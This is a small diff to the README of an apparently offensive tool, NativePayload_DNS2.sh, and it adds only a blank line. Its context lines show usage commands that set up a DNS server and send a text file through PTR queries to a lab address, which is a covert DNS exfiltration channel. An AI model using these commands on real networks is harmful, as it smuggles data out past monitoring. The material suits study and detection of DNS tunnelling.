@@ -37,6 +37,7 @@ STEP 3 : Now you can Copy and Paste your C# code to your Virtual Machine for tes
 	example IPv4:192.168.56.111 : ./NativePayload_DNS2.sh -u text.txt 192.168.56.110  0
   
 	Description: with A-Step1 you will make DNS Server , with A-Step2 you can Send text file via PTR Queries to DNS server
+	
   
 	Example B-Step1: (Server Side ) ./NativePayload_DNS2.sh -d makedns test.txt mydomain.com
   
